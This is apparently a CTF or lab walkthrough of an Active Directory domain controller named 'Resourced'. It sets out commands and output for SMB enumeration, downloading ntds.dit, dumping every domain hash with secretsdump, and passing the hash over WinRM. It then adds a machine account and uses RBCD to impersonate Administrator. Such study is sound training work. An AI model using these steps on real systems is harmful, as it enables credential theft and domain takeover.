# Resourced
![image](https://hackmd.io/_uploads/HyCX4oJaJg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ nmap -sC -sV -p- 192.168.122.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 23:33 EDT
Nmap scan report for 192.168.122.175
Host is up (0.091s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-25 03:37:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-25T03:38:41+00:00
|_ssl-date: 2025-03-25T03:39:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-03-24T03:32:50
|_Not valid after:  2025-09-23T03:32:50
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-25T03:38:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 345.10 seconds

```
> DNS, kerberos, SMB, WinRM, kpasswd5, Ldap, RPC

### 1.2 SMB
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ enum4linux -a 192.168.122.175
...
 ==========================( Enumerating Workgroup/Domain on 192.168.122.175 )==========================
                               
[E] Can't find workgroup/domain  
...
 ===============================( Getting domain SID for 192.168.122.175 )===============================
                                                                                                                     
Domain Name: resourced                                                                                               
Domain Sid: S-1-5-21-537427935-490066102-1511301751
...
 ======================================( Users on 192.168.122.175 )======================================
                                                                                                                     
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]

 ==========================( Password Policy Information for 192.168.122.175 )==========================

[+] Attaching to 192.168.122.175 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.122.175)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] resourced
        [+] Builtin

[+] Password Info for Domain: resourced

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:                                                                                                
Password Complexity: Enabled                                                                                         
Minimum Password Length: 7

 =====================================( Groups on 192.168.122.175 )=====================================
                            
[+] Getting builtin groups:                                                                  
group:[Server Operators] rid:[0x225]                                                                                 
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
[+]  Getting builtin group memberships:                                                                              
                                                                                                                     
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs                                                        
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs

[+]  Getting local groups:                                                                                             
group:[Cert Publishers] rid:[0x205]                                                                                  
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                       
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs                           

[+]  Getting domain groups:                                                               
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                          
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:                                                  
Group: 'Group Policy Creator Owners' (RID: 520) has member: resourced\Administrator                                  
Group: 'Domain Guests' (RID: 514) has member: resourced\Guest
Group: 'Domain Admins' (RID: 512) has member: resourced\Administrator
Group: 'Schema Admins' (RID: 518) has member: resourced\Administrator
Group: 'Domain Users' (RID: 513) has member: resourced\Administrator
Group: 'Domain Users' (RID: 513) has member: resourced\krbtgt
Group: 'Domain Users' (RID: 513) has member: resourced\M.Mason
Group: 'Domain Users' (RID: 513) has member: resourced\K.Keen
Group: 'Domain Users' (RID: 513) has member: resourced\L.Livingstone
Group: 'Domain Users' (RID: 513) has member: resourced\J.Johnson
Group: 'Domain Users' (RID: 513) has member: resourced\V.Ventz
Group: 'Domain Users' (RID: 513) has member: resourced\S.Swanson
Group: 'Domain Users' (RID: 513) has member: resourced\P.Parker
Group: 'Domain Users' (RID: 513) has member: resourced\R.Robinson
Group: 'Domain Users' (RID: 513) has member: resourced\D.Durant
Group: 'Domain Users' (RID: 513) has member: resourced\G.Goldberg
Group: 'Enterprise Admins' (RID: 519) has member: resourced\Administrator
Group: 'Domain Controllers' (RID: 516) has member: resourced\RESOURCEDC$
```
> 1. Domain Name: resourced
> 2. User 建立 `ADuesr.txt`
> 3. `V.Ventz` 疑似密碼：`HotelCalifornia194!`

使用 `V.Ventz:HotelCalifornia194!` 查看 SMB
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ crackmapexec smb 192.168.122.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
SMB         192.168.122.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.122.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.122.175 445    RESOURCEDC       [+] Enumerated shares
SMB         192.168.122.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.122.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.122.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.122.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.122.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.122.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.122.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.122.175 445    RESOURCEDC       SYSVOL          READ            Logon server share
```
下載到本機
```
┌──(chw㉿CHW)-[~/Resourced/SMB_Ventz]
└─$ smbclient //192.168.122.175/'Password Audit' -U 'V.Ventz' -c "recurse ON; prompt OFF; mget *"

Password for [WORKGROUP\V.Ventz]:
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (2213.7 KiloBytes/sec) (average 2213.7 KiloBytes/sec)
...

┌──(chw㉿CHW)-[~/Resourced/SMB_Ventz]
└─$ smbclient //192.168.122.175/NETLOGON -U 'V.Ventz' -c "recurse ON; prompt OFF; mget *"

┌──(chw㉿CHW)-[~/Resourced/SMB_Ventz]
└─$ smbclient //192.168.122.175/SYSVOL -U 'V.Ventz' -c "recurse ON; prompt OFF; mget *"

Password for [WORKGROUP\V.Ventz]:
NT_STATUS_ACCESS_DENIED listing \resourced.local\DfsrPrivate\*
...

┌──(chw㉿CHW)-[~/Resourced/SMB_Ventz]
└─$ tree
.
├── Paaaword Audit
│   ├── Active Directory
│   │   ├── ntds.dit
│   │   └── ntds.jfm
│   └── registry
│       ├── SECURITY
│       └── SYSTEM
└── SYSVOL
    └── resourced.local
        ├── DfsrPrivate
        ├── Policies
        │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
        │   │   ├── GPT.INI
        │   │   ├── MACHINE
        │   │   │   ├── Microsoft
        │   │   │   │   └── Windows NT
        │   │   │   │       └── SecEdit
        │   │   │   │           └── GptTmpl.inf
        │   │   │   └── Registry.pol
        │   │   └── USER
        │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
        │       ├── GPT.INI
        │       ├── MACHINE
        │       │   └── Microsoft
        │       │       └── Windows NT
        │       │           └── SecEdit
        │       │               └── GptTmpl.inf
        │       └── USER
        └── scripts

21 directories, 9 files

```
> `NETLOGON` 是空的\
> 手動查看檔案
> > `Paaaword Audit/Active Directory/ntds.dit` 與 `Password Audit/registry/SYSTEM` 可以爆破 AD 使用者密碼

### 2. `ntds.dit`+ `SYSTEM` 爆破 AD User
```
┌──(chw㉿CHW)-[~/Resourced/SMB_Ventz/Paaaword Audit]
└─$ impacket-secretsdump  -ntds "Active Directory/ntds.dit" -system registry/SYSTEM LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from Active Directory/ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up... 

```
> 將 `username:RID:LM hash:NT hash:::` 改成 `NT hash`儲存成 ADUser.hash

### 3. John 爆破
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ cat ADUser.hash                                      
12579b1666d4ac10f0f59f300776495f
31d6cfe0d16ae931b73c59d7e0c089c0
9ddb6f4d9d01fedeb4bccfb09df1b39d
3004b16f88664fbebfcb9ed272b0565b
3105e0f6af52aba8e11d19f27e487e45
204410cc5a7147cd52a04ddae6754b0c
19a3a7550ce8c505c2d46b5e39d6f808
3e028552b946cc4f282b72879f63b726
913c144caea1c0a936fd1ccb46929d3c
bd7c11a9021d2708eda561984f3c8939
980910b8fc2e4fe9d482123301dd19fe
fea5a148c14cf51590456b2102b29fac
08aca8ed17a9eec9fac4acdcb4652c35
62e16d17c3015c47b4d513e65ca757a2
                                                           
┌──(chw㉿CHW)-[~/Resourced]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ADUser.hash
Using default input encoding: UTF-8
Loaded 14 password hashes with no different salts (NT [MD4 128/128 ASIMD 4x2])
Remaining 13 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-03-25 02:22) 0g/s 15762Kp/s 15762Kc/s 204909KC/s "amo-te"..*7¡Vamos!
Session completed.
```
### 4. crackmapexec winrm
crackmapexec 讀不了整個 ADUser.txt，只能逐一嘗試
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ crackmapexec winrm 192.168.122.175 -u Administrator -H ADUser.hash
SMB         192.168.122.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.122.175 5985   RESOURCEDC       [*] http://192.168.122.175:5985/wsman
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
...
┌──(chw㉿CHW)-[~/Resourced]
└─$ crackmapexec winrm 192.168.122.175 -u M.Mason -H ADUser.hash 

┌──(chw㉿CHW)-[~/Resourced]
└─$ crackmapexec winrm 192.168.122.175 -u K.Keen -H ADUser.hash 

┌──(chw㉿CHW)-[~/Resourced]
└─$ crackmapexec winrm 192.168.122.175 -u L.Livingstone -H ADUser.hash  
SMB         192.168.122.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.122.175 5985   RESOURCEDC       [*] http://192.168.122.175:5985/wsman
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:31d6cfe0d16ae931b73c59d7e0c089c0
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:9ddb6f4d9d01fedeb4bccfb09df1b39d
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3004b16f88664fbebfcb9ed272b0565b
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.122.175 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.122.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!) 
```
>`resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808`

### 5. Evil-winrm
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ evil-winrm -i 192.168.122.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> hostname
ResourceDC
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
> 不是 Local Admin 也不是 Domain admin

### ✅ Get User Flag
> 在 `C:\Users\L.Livingstone\Desktop` 找到 User flag
## Privileges Escalation
### 6. BloodHound
#### 6.1 上傳並執行 SharpHound
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload /home/chw/Resourced/SharpHound.ps1
                                        
Info: Uploading /home/chw/Resourced/SharpHound.ps1 to C:\Users\L.Livingstone\Documents\SharpHound.ps1
                                        
Data: 1744464 bytes of 1744464 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\L.Livingstone\Documents>
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\L.Livingstone\Documents"
 
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls


    Directory: C:\Users\L.Livingstone\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/24/2025  11:54 PM          11760 20250324235440_BloodHound.zip
-a----        3/24/2025  11:54 PM           8964 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
-a----        3/24/2025  11:50 PM        1308348 SharpHound.ps1
```
#### 6.2 下載結果分析
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> download 20250324235440_BloodHound.zip
                                        
Info: Downloading C:\Users\L.Livingstone\Documents\20250324235440_BloodHound.zip to 20250324235440_BloodHound.zip
                                        
Info: Download successful!
```
Upload 到 BloodHound
```
MATCH (u:User) RETURN u
```
標記 `L.Livingstone` "Marked User As Owned"\
![image](https://hackmd.io/_uploads/Sk3-e1xpJx.png)

![image](https://hackmd.io/_uploads/ByAdJyxpJe.png)
> 對 DC具有 GenericAll 存取權。但目前沒有 local admin，也嘗試 Windows 提權不可行。

### 7. 創建受信任的 computer
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.122.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'chw' -computer-pass 'chw'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account chw$ with password chw.
```
>`impacket-addcomputer`:Impacket 套件中的工具，用來把一個新機器加入 AD\
`resourced.local/l.livingstone`: 指定網域與 username\
`-dc-ip 192.168.122.175`: 指定網域控制器（Domain Controller, DC）的 IP\
`-hashes :19a3a7550ce8c505c2d46b5e39d6f808`: 提供使用者的 NTLM hash（空 LM hash + NT hash）作為身份驗證方式（不需要密碼）\
`-computer-name 'chw'`:新增的機器帳號名稱，實際上會建立 `chw$`\
`-computer-pass 'chw'`:指定這個新機器帳號的密碼，也可用於後續攻擊

在 Evil-WinRM 就能存取新增的機器
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-ADcomputer chw


DistinguishedName : CN=chw,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : chw
ObjectClass       : computer
ObjectGUID        : 7995573d-8ff5-4865-9ad8-bfc65f318b71
SamAccountName    : chw$
SID               : S-1-5-21-537427935-490066102-1511301751-4101
UserPrincipalName :
```
### 8. Resource-Based Constrained Delegation (RBCD) 
功從一般網域帳號 l.livingstone 提權成 Domain Controller 上的 SYSTEM 權限
#### 8.1 設定 RBCD 權限
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ sudo python3 /home/chw/Tools/impacket/rbcd.py -dc-ip 192.168.122.175 -t RESOURCEDC -f 'chw' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced.local\\l.livingstone

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.122.175
[*] Using resourced.local\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `chw` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] chw$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```
> `-dc-ip 192.168.122.175`: 指定 Domain Controller 的 IP\
`-t RESOURCEDC`: 指定目標主機（被寫入 RBCD 權限的機器）\
`-f 'chw'` 提供用來修改 RBCD 權限的帳號（chw）\
`-hashes :19a3a7550ce8c505c2d46b5e39d6f808`:指定帳號的 NTLM hash，格式為 LMHASH:NTHASH（這裡 LM 為空）
`resourced.local\\l.livingstone`: 被寫入權限的目標（SPN 所屬主體）
> > 剛新增的機器帳號 chw$ 的安全描述符 (security descriptor)，寫入目標機器 RESOURCEDC 的 msDS-AllowedToActOnBehalfOfOtherIdentity 屬性中\
> > 所以可以用 chw 這個帳號（透過其 hash 認證）連線到 DC，並修改 RESOURCEDC 這台電腦帳號的 RBCD 權限，讓 resourced.local\l.livingstone 這個帳號可以被它模擬。

#### 8.2 假冒 Administrator 拿 TGS (S4U2Proxy)
從 AD 中請求 Service Ticket (ST)，並偽造（impersonate）Administrator 的身分
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced.local/chw\$:'chw' -impersonate Administrator -dc-ip 192.168.122.175

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```
> `-spn cifs/resourcedc.resourced.local`: 目標服務的 SPN（這裡是 RESOURCEDC 的 SMB/CIFS）\
`resourced.local/chw\$:'chw'`: 模擬帳號的身份與密碼\
`-impersonate Administrator`: 要偽造的目標使用者身分\
`-dc-ip 192.168.122.175 `: Domain Controller IP
